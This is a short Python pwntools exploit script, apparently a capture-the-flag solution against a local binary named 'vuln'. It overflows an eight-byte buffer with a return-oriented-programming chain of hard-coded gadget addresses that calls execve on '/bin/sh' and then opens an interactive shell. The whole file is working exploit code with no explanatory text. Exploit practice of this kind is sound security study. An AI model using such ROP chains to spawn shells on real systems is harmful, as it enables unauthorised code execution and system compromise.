from pwn import *


elf = context.binary = ELF("./vuln")


# 0x0000000010000015 : syscall
# 0x0000000010000018 : pop rax ; ret
# 0x000000001000001a : pop rdi ; ret
# 0x000000001000001e : pop rdx ; ret
# 0x000000001000001c : pop rsi ; ret

syscall = 0x0000000010000015
pop_rax = 0x0000000010000018
pop_rdi = 0x000000001000001a
pop_rdx = 0x000000001000001e
pop_rsi = 0x000000001000001c
binsh = 0x10000250 


payload = flat([
    8 * b"A",
    pop_rax,
    0x3b,
    pop_rdi,
    binsh,
    pop_rsi,
    0,
    pop_rdx,
    0,
    syscall
])

p = process()
p.sendline(payload)
p.interactive()